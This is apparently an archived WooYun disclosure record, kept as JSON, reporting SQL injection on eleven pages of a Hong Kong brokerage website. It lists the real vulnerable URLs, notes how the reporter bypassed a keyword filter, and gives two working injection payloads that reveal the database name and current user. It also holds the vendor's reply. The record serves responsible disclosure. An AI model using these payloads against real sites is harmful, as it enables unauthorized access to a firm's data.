{"id": 83579, "wybug_id": "wooyun-2015-0147414", "wybug_title": "香港国元证券十一处SQL注入打包（stacked queries）", "wybug_corp": "国元证券", "wybug_author": "路人甲", "wybug_date": "2015-10-17 15:49", "wybug_open_date": "2015-12-04 13:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-04：\t细节向公众公开  简要描述： O(∩_∩)O哈哈~打扰了~ 详细说明：  目标站：国元证券的香港站点http://www1.gyzq.com.hk/发现十一处注入点：（stacked queries）\nhttp://www1.gyzq.com.hk/service/s_tzymjh.aspx?MenuNo=1http://www1.gyzq.com.hk/service/khdown1.aspx?a=440101&moduleno=1http://www1.gyzq.com.hk/service/guide.aspx?ModuleNo=1http://www1.gyzq.com.hk/service/about.aspx?id=1http://www1.gyzq.com.hk/newfile/showmsg.aspx?ID=3&ModuleNo=1http://www1.gyzq.com.hk/info/newslist.aspx?menuno=1http://www1.gyzq.com.hk/info/newsdetail.aspx?newsID=1http://www1.gyzq.com.hk/en/service/khdown1.aspx?a=440102&moduleno=1http://www1.gyzq.com.hk/en/service/guide.aspx?ModuleNo=1http://www1.gyzq.com.hk/en/service/about.aspx?id=1http://www1.gyzq.com.hk/en/info/newslist.aspx?MenuNo=1\n任意挑一处扔SQLMap中：\n\n存在stacked queries和延时，但SQLMap选择了延时进行注入，貌似遇到了过滤，没跑出来。手工用stacked queries跑吧，发现and/select之类的都遭到封杀，不过用or还是可以的~~1、列出当前数据库\nhttp://www1.gyzq.com.hk/service/download.aspx?ModuleNo=4406' or db_name()>1 -- -\n\n\n2、列出当前用户\nhttp://www1.gyzq.com.hk/service/download.aspx?ModuleNo=4406' or user>1 -- -\n\n\n安全考虑，其他数据就不跑了。   漏洞证明：     修复方案：  请多指教~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-10-20 13:43 厂商回复： 感谢您对国元证券的关注，此漏洞为“國元証券經紀(香港)有限公司”相关信息系统的，与国元证券股份有限公司无关，我们已将漏洞内容转交信息系统管理者，其正在对漏洞风险进行后续安全处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}